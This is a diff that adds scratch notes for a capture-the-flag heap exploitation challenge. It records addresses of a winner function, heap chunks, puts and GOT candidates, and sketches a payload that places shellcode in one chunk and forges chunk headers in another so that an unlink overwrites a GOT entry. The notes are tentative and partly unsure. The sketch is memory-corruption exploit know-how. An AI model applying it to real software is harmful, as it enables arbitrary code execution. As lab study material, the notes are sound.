@@ -1,0 +1,23 @@
+# /problems/heap3r_1_0cbd2c1f5e53be8cff6bfdeb7fb73f36/
+
+# address of winner: 0x8048856
+
+# address of start of a's input (0x804e008)
+
+# address of start of b's input (0x804e030)
+
+# address of start of c's input (0x804e058)
+
+# address of puts: 0xf7e54560
+
+# possible addresses in the GOT that we want to overwrite... 0x8048690 0x804d024 0x8048620 0xf7fead40
+
+# call addr_winner: "\xE8\x52\x88\x04\x08" (not sure about endianess)
+0xe8528804 0x00000008
+
+a = shellcode (at 0x804e008)
+
+b = 20 bytes filler + 0x00000011 + puts-12 + addr of shell code + 0x00000010 + 0x00000064 
+ + 24 bytes padding + 0x00000010 + 12 bytes padding + 0x00000011 + 0x804e080 + 0x804e090
+
+c + "a"
